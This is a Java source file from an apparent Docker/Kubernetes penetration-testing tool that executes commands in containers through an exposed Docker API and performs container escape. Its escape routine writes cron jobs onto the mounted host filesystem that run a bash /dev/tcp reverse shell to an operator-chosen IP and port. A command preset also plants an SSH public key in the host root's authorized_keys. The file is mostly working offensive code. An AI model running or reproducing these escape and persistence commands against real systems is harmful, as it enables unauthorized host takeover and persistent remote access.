package com.k8spen.tool.controller;

import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.k8spen.tool.helper.DockerContainerItem;
import com.k8spen.tool.helper.DockerImageItem;
import com.k8spen.tool.utils.DockerApiUtil;
import com.k8spen.tool.view.ResultPane;
import javafx.collections.ListChangeListener;
import javafx.concurrent.Task;
import javafx.scene.control.ComboBox;
import javafx.scene.control.ListCell;
import javafx.scene.control.TextField;
import javafx.scene.control.Tooltip;

import java.util.ArrayList;
import java.util.List;

/**
 * Docker API — 命令执行与容器逃逸。
 *
 * 命令执行等价于 `docker exec`（bash/sh -c），容器逃逸对应原始 DockerAPITool 的
 * EscapeController：特权容器 + 宿主机根目录挂载 → 写宿主机定时任务反弹 Shell。
 */
public class DockerExecHandler {

    /** exec 输出是流式响应，读超时需要比普通 API 请求更长 */
    private static final int EXEC_READ_TIMEOUT_SEC = 300;

    private final ControllerContext ctx;
    private final DockerHandler dockerHandler;

    private final ComboBox<DockerContainerItem> dockerExecContainer;
    private final ComboBox<String> dockerShellOpt;
    private final ComboBox<String> dockerExecCmd;
    private final ResultPane dockerExecOutput;

    private final ComboBox<DockerContainerItem> dockerEscapeContainer;
    private final ComboBox<String> dockerEscapeShell;
    private final ComboBox<String> dockerEscapeOs;
    private final TextField dockerEscapeMount;
    private final TextField dockerEscapeHostRoot;
    private final TextField dockerEscapeLhost;
    private final TextField dockerEscapeLport;
    private final ResultPane dockerEscapeCheck;
    private final ResultPane dockerEscapeOutput;

    public DockerExecHandler(ControllerContext ctx, DockerHandler dockerHandler,
                             ComboBox<DockerContainerItem> dockerExecContainer, ComboBox<String> dockerShellOpt,
                             ComboBox<String> dockerExecCmd, ResultPane dockerExecOutput,
                             ComboBox<DockerContainerItem> dockerEscapeContainer, ComboBox<String> dockerEscapeShell,
                             ComboBox<String> dockerEscapeOs, TextField dockerEscapeMount,
                             TextField dockerEscapeHostRoot, TextField dockerEscapeLhost,
                             TextField dockerEscapeLport, ResultPane dockerEscapeCheck,
                             ResultPane dockerEscapeOutput) {
        this.ctx = ctx;
        this.dockerHandler = dockerHandler;
        this.dockerExecContainer = dockerExecContainer;
        this.dockerShellOpt = dockerShellOpt;
        this.dockerExecCmd = dockerExecCmd;
        this.dockerExecOutput = dockerExecOutput;
        this.dockerEscapeContainer = dockerEscapeContainer;
        this.dockerEscapeShell = dockerEscapeShell;
        this.dockerEscapeOs = dockerEscapeOs;
        this.dockerEscapeMount = dockerEscapeMount;
        this.dockerEscapeHostRoot = dockerEscapeHostRoot;
        this.dockerEscapeLhost = dockerEscapeLhost;
        this.dockerEscapeLport = dockerEscapeLport;
        this.dockerEscapeCheck = dockerEscapeCheck;
        this.dockerEscapeOutput = dockerEscapeOutput;
    }

    public void init(String sshPublicKey) {
        dockerShellOpt.getItems().addAll("bash", "sh");
        dockerShellOpt.setValue("bash");
        initCommandPresets(sshPublicKey);
        dockerEscapeShell.getItems().addAll("bash", "sh");
        dockerEscapeShell.setValue("bash");
        dockerEscapeOs.getItems().addAll("Ubuntu", "CentOS");
        dockerEscapeOs.setValue("Ubuntu");

        bindContainers(dockerExecContainer);
        bindContainers(dockerEscapeContainer);
    }

    private void initCommandPresets(String sshPublicKey) {
        String sshCommand = "echo '" + sshPublicKey + "' >> /peninfo/root/.ssh/authorized_keys";
        dockerExecCmd.getItems().setAll("whoami", "id", "ip a", "pwd", "uname -a", "ls -al /peninfo", sshCommand);
        // 列表使用简短名称，编辑框保留完整命令，避免长公钥撑宽弹出列表。
        dockerExecCmd.setCellFactory(list -> new ListCell<>() {
            @Override
            protected void updateItem(String command, boolean empty) {
                super.updateItem(command, empty);
                setText(empty || command == null ? null : command.equals(sshCommand)
                        ? "写入 SSH 公钥（/peninfo/root/.ssh/authorized_keys）" : command);
                Tooltip tooltip = empty || command == null ? null : new Tooltip(command);
                if (tooltip != null) {
                    tooltip.setWrapText(true);
                    tooltip.setMaxWidth(640);
                }
                setTooltip(tooltip);
            }
        });
        dockerExecCmd.setValue("id");
        dockerExecCmd.setVisibleRowCount(7);
    }

    private void bindContainers(ComboBox<DockerContainerItem> combo) {
        combo.setItems(dockerHandler.containers());
        dockerHandler.containers().addListener((ListChangeListener<DockerContainerItem>) change -> {
            if (combo.getValue() == null && !combo.getItems().isEmpty()) {
                combo.getSelectionModel().selectFirst();
            }
        });
    }

    // ==== 命令执行 ====

    public void execCommand() {
        DockerContainerItem container = dockerExecContainer.getValue();
        if (container == null) {
            ctx.log("[-] 请先选择容器（可在“容器管理”中刷新容器列表）");
            return;
        }
        String input = dockerExecCmd.getEditor().getText();
        String command = input == null ? "" : input.trim();
        if (command.isEmpty()) {
            ctx.log("[-] 请输入要执行的命令");
            return;
        }
        String shell = dockerShellOpt.getValue() == null ? "sh" : dockerShellOpt.getValue();
        DockerApiUtil api = dockerHandler.client();
        if (api == null) return;

        dockerExecOutput.setText("执行中...");
        ctx.setStatus("正在容器 " + container.getName() + " 中执行命令");
        ctx.log("[*] exec " + container.getName() + " → " + shell + " -c " + command);

        Task<String> task = new Task<>() {
            @Override
            protected String call() throws Exception {
                return api.execCapture(container.getFullId(), shell, command, EXEC_READ_TIMEOUT_SEC);
            }
        };
        task.setOnSucceeded(event -> {
            String output = task.getValue();
            if (output == null || output.isBlank()) output = "(命令已执行，无输出)";
            dockerExecOutput.setPlainText("$ " + shell + " -c " + command + "\n" + output);
            ctx.log("[+] 命令执行完成: " + container.getName());
            ctx.setStatus("命令执行完成");
        });
        task.setOnFailed(event -> {
            String message = task.getException() == null ? "未知错误" : task.getException().getMessage();
            dockerExecOutput.setPlainText("[-] 执行失败: " + message);
            ctx.log("[-] 命令执行失败: " + message);
            ctx.setStatus("命令执行失败");
        });
        new Thread(task).start();
    }

    public void clearExecOutput() {
        dockerExecOutput.clear();
        ctx.log("[*] 命令输出已清空");
    }

    // ==== 容器逃逸 ====

    public void escapeInspect() {
        DockerContainerItem container = dockerEscapeContainer.getValue();
        if (container == null) {
            ctx.log("[-] 请先选择容器（可在“容器管理”中刷新容器列表）");
            return;
        }
        DockerApiUtil api = dockerHandler.client();
        if (api == null) return;

        Task<DockerApiUtil.Response> task = new Task<>() {
            @Override
            protected DockerApiUtil.Response call() throws Exception {
                return api.request("GET", "/containers/" + container.getFullId() + "/json", null);
            }
        };
        task.setOnSucceeded(event -> {
            DockerApiUtil.Response response = task.getValue();
            if (!response.ok()) {
                dockerEscapeCheck.setPlainText("[-] 获取容器详情失败: HTTP " + response.code());
                ctx.log("[-] 获取容器详情失败: HTTP " + response.code());
                return;
            }
            JsonObject root = response.asObject();
            JsonObject hostConfig = child(root, "HostConfig");
            boolean privileged = bool(hostConfig, "Privileged");
            List<String> bindList = strings(array(hostConfig, "Binds"));
            String binds = bindList.isEmpty() ? "(无挂载)" : String.join("  |  ", bindList);
            String image = child(root, "Config") == null ? "-" : string(child(root, "Config"), "Image");
            if (!DockerImageItem.hasReference(image)) image = string(root, "Image");
            if (!DockerImageItem.hasReference(image)) image = "未返回镜像信息";

            StringBuilder summary = new StringBuilder();
            summary.append("当前容器ID: ").append(container.getFullId()).append("\n");
            summary.append("容器名称: ").append(container.getName()).append("\n");
            summary.append("镜像: ").append(image).append("\n");
            summary.append("是否特权模式: ").append(privileged).append("\n");
            summary.append("挂载情况: ").append(binds).append("\n");
            summary.append("说明: 只有特权模式且宿主机根目录挂载到容器内目录（如 / → /peninfo）时，")
                    .append("内置逃逸命令才能写入宿主机定时任务；自定义挂载路径请按实际路径改写命令。\n");
            dockerEscapeCheck.showResponse(response.display(), summary.toString());

            if (!privileged) {
                ctx.log("[!] 目标容器不是特权模式，内置逃逸命令大概率无效");
            } else {
                ctx.log("[+] 目标容器为特权模式，可尝试挂载逃逸");
            }
            if (bindList.isEmpty()) {
                ctx.log("[!] 目标容器没有任何 bind 挂载，无法写入宿主机文件");
            }
        });
        task.setOnFailed(event -> {
            String message = task.getException() == null ? "未知错误" : task.getException().getMessage();
            dockerEscapeCheck.setPlainText("[-] 检测失败: " + message);
            ctx.log("[-] 逃逸检测失败: " + message);
        });
        new Thread(task).start();
    }

    public void escapeRun() {
        DockerContainerItem container = dockerEscapeContainer.getValue();
        if (container == null) {
            ctx.log("[-] 请先选择容器（可在“容器管理”中刷新容器列表）");
            return;
        }
        String lhost = trim(dockerEscapeLhost.getText());
        String lport = trim(dockerEscapeLport.getText());
        if (lhost.isEmpty() || lport.isEmpty()) {
            ctx.log("[-] 请填写反弹 Shell 的 IP 与端口");
            return;
        }
        String mount = normalizePath(trim(dockerEscapeMount.getText()), "/peninfo");
        String hostRoot = normalizePath(trim(dockerEscapeHostRoot.getText()), "/");
        String os = dockerEscapeOs.getValue() == null ? "Ubuntu" : dockerEscapeOs.getValue();
        String shell = dockerEscapeShell.getValue() == null ? "bash" : dockerEscapeShell.getValue();
        List<String> commands = buildEscapeCommands(os, mount, hostRoot, lhost, lport);

        DockerApiUtil api = dockerHandler.client();
        if (api == null) return;

        dockerEscapeOutput.setText("执行中...");
        ctx.setStatus("正在对 " + container.getName() + " 执行容器逃逸");
        ctx.log("[*] 开始执行 " + os + " 逃逸命令，反弹地址 " + lhost + ":" + lport);

        Task<String> task = new Task<>() {
            @Override
            protected String call() throws Exception {
                StringBuilder log = new StringBuilder();
                log.append("========== ").append(os).append(" 逃逸 ==========\n\n");
                if ("sh".equals(shell)) {
                    log.append("[!] 当前 Shell 为 sh，/dev/tcp 反弹需要 bash，建议切换为 bash\n\n");
                }
                for (String command : commands) {
                    log.append("$ ").append(command).append("\n");
                    String output = api.execCapture(container.getFullId(), shell, command, EXEC_READ_TIMEOUT_SEC);
                    if (output == null || output.isBlank()) {
                        log.append("(无输出)\n\n");
                    } else {
                        log.append(output);
                        if (!output.endsWith("\n")) log.append("\n");
                        log.append("\n");
                    }
                }
                log.append("所有命令已执行完毕，请等待 Shell 回连（定时任务默认每分钟触发一次）。\n");
                return log.toString();
            }
        };
        task.setOnSucceeded(event -> {
            dockerEscapeOutput.setPlainText(task.getValue());
            ctx.log("[+] 逃逸命令执行完毕，请等待反弹 Shell");
            ctx.setStatus("逃逸命令执行完毕，等待反弹 Shell");
        });
        task.setOnFailed(event -> {
            String message = task.getException() == null ? "未知错误" : task.getException().getMessage();
            dockerEscapeOutput.setPlainText("[-] 逃逸执行失败: " + message);
            ctx.log("[-] 逃逸执行失败: " + message);
            ctx.setStatus("逃逸执行失败");
        });
        new Thread(task).start();
    }

    /**
     * 生成逃逸命令，与原始 DockerAPITool EscapeController 的硬编码 Exp 一致，
     * 但挂载点/宿主机根目录可按实际情况调整（传入路径会先做规范化）。
     */
    static List<String> buildEscapeCommands(String os, String mount, String hostRoot, String lhost, String lport) {
        String mountPath = normalizePath(mount == null ? "" : mount.trim(), "/peninfo");
        String hostRootPath = normalizePath(hostRoot == null ? "" : hostRoot.trim(), "/");
        List<String> commands = new ArrayList<>();
        if ("CentOS".equalsIgnoreCase(os)) {
            commands.add("echo '* * * * * bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1' >> "
                    + join(mountPath, "var/spool/cron/root"));
            return commands;
        }
        String script = join(mountPath, "sectest.sh");
        String hostScript = join(hostRootPath, "sectest.sh");
        commands.add("echo '#!/bin/bash' > " + script);
        commands.add("echo 'bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1' >> " + script);
        commands.add("chmod a+x " + script);
        commands.add("echo '* * * * * root bash " + hostScript + "' >> " + join(mountPath, "etc/crontab"));
        return commands;
    }

    // ==== 工具方法 ====

    private static String trim(String value) {
        return value == null ? "" : value.trim();
    }

    private static String normalizePath(String value, String fallback) {
        String path = value.isEmpty() ? fallback : value;
        if (!path.startsWith("/")) path = "/" + path;
        while (path.length() > 1 && path.endsWith("/")) path = path.substring(0, path.length() - 1);
        return path;
    }

    private static String join(String base, String name) {
        return "/".equals(base) ? "/" + name : base + "/" + name;
    }

    private static JsonObject child(JsonObject json, String key) {
        if (json == null) return null;
        JsonElement element = json.get(key);
        return element != null && element.isJsonObject() ? element.getAsJsonObject() : null;
    }

    private static boolean bool(JsonObject json, String key) {
        if (json == null) return false;
        JsonElement element = json.get(key);
        return element != null && !element.isJsonNull() && element.getAsBoolean();
    }

    private static String string(JsonObject json, String key) {
        JsonElement element = json == null ? null : json.get(key);
        return element == null || element.isJsonNull() ? "-" : element.getAsString();
    }

    private static List<String> strings(JsonArray array) {
        List<String> values = new ArrayList<>();
        if (array == null) return values;
        for (JsonElement element : array) {
            if (element != null && element.isJsonPrimitive()) values.add(element.getAsString());
        }
        return values;
    }

    private static JsonArray array(JsonObject json, String key) {
        return json != null && json.get(key) instanceof JsonArray values ? values : null;
    }
}
